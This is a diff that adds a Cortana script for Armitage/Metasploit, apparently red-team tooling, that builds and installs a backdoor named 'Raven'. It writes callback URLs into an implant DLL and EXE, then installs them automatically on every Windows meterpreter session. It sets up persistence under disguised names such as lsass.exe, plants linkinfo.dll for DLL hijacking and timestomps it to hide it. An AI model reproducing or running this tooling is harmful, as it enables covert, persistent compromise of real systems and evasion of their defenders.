@@ -1,0 +1,143 @@
+#
+# Cortana Script to install Raven
+# - Do not use this on a pen test unless you're a crazy person. I wouldn't keep you around.
+#
+# Load this into Armitage
+# - http://www.fastandeasyhacking.com/
+#
+# Cortana Documentation is at:
+# - http://www.fastandeasyhacking.com/manual#8
+# 
+debug(7);
+
+global('%attr %start %touched @urls');
+
+@urls = @(
+	"http://192.168.95.241/a",
+	"http://192.168.95.241/b",
+	"http://192.168.95.241/c",
+	"http://192.168.95.241/d"
+);
+
+sub build_url_list {
+	return @urls;
+}
+
+sub backdoor_init {
+	local('@urls $handle $data $index $urls');
+
+	#
+	# create our DLL
+	# 
+	@urls = build_url_list();
+
+	$handle = openf(script_resource("raven.dll"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$index = indexOf($data, 'A' x 1024);
+
+	$urls = join(",", @urls) . "\x00";
+	$data = replaceAt($data, "$[1024]urls", $index);
+
+	$handle = openf('>linkinfo.dll');
+	writeb($handle, $data);
+	closef($handle);
+
+	file_put("linkinfo.dll");
+	delete_later("linkinfo.dll");
+
+	#
+	# create our EXE
+	#
+	@urls = build_url_list("b");
+
+	$handle = openf(script_resource("raven.exe"));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	$index = indexOf($data, 'A' x 1024);
+
+	$urls = join(",", @urls) . "\x00";
+	$data = replaceAt($data, "$[1024]urls", $index);
+
+	$handle = openf('>r.exe');
+	writeb($handle, $data);
+	closef($handle);
+
+	file_put("r.exe");
+	delete_later("r.exe");
+
+	println("Raven created!");
+}
+
+backdoor_init();
+
+# grab the timestomp values and store them... we're going to need them later.
+on meterpreter_timestomp {
+	local('$key $value');
+	foreach $key => $value (parse_timestomp($3)) {
+		%attr[$1][$key] = $value;
+	}
+}
+
+on meterpreter_timeout {
+	warn("Timeout: " . @_);	
+}
+
+on meterpreter_getuid {
+	if ($1 in %attr) {
+		m_timestomp($1, "linkinfo.dll", %attr[$1]);
+	}
+	else {
+		if (size(%attr) > 0) {
+			m_timestomp($1, "linkinfo.dll", rand(values(%attr)));
+		}
+		println("Warning... timestamp on $1 does not exist! Using some other set :)");
+	}
+	local('$time');
+	$time = (ticks() - %start[$1]) / 1000.0;
+	println("Raven installed on session $1 (" . session_host($1) . ") in $time $+ s");
+}
+
+sub install_raven {
+	# step 1. grab timestomp info for linkinfo.dll
+	m_cmd($1, "use stdapi");
+	m_cmd($1, "use priv");
+
+	# step 0. do this metasploit persistence style
+
+	post("windows/manage/persistence", $1, %(ACTION => 'REXE', HANDLER => 0, REXE => "r.exe", REXENAME => "lsass.exe", STARTUP => "SYSTEM"));
+	post("windows/manage/persistence", $1, %(ACTION => 'REXE', HANDLER => 0, REXE => "r.exe", REXENAME => "vmwaretoolsd.exe", STARTUP => "SERVICE"));
+	post("windows/manage/persistence", $1, %(ACTION => 'REXE', HANDLER => 0, REXE => "r.exe", REXENAME => "tray.exe", STARTUP => "USER"));
+
+	# step 1.5. ...
+	m_cd($1, 'c:\windows\system32');
+	m_cmd($1, "timestomp linkinfo.dll -v");
+
+	# step 2. upload linkinfo.dll
+	m_cd($1, 'c:\windows');
+	m_cmd($1, "upload linkinfo.dll linkinfo.dll");
+
+	# step 3.
+	m_cmd($1, "getuid");
+}
+
+on session_sync {
+	if (-iswinmeterpreter $1 && session_host($1) !in %touched) {
+		%touched[session_host($1)] = 1;
+		println("[*] Installing Raven on $1");
+		%start[$1] = ticks();
+		install_raven($1);
+	}
+	else {
+		println("[-] Skipping " . session_host($1) . "/ $+ $1");
+	}
+}
+
+popup meterpreter_top {
+	item "Install Raven" {
+		println("[*] Installing raven on $1");
+		install_raven($1);
+	}
+}
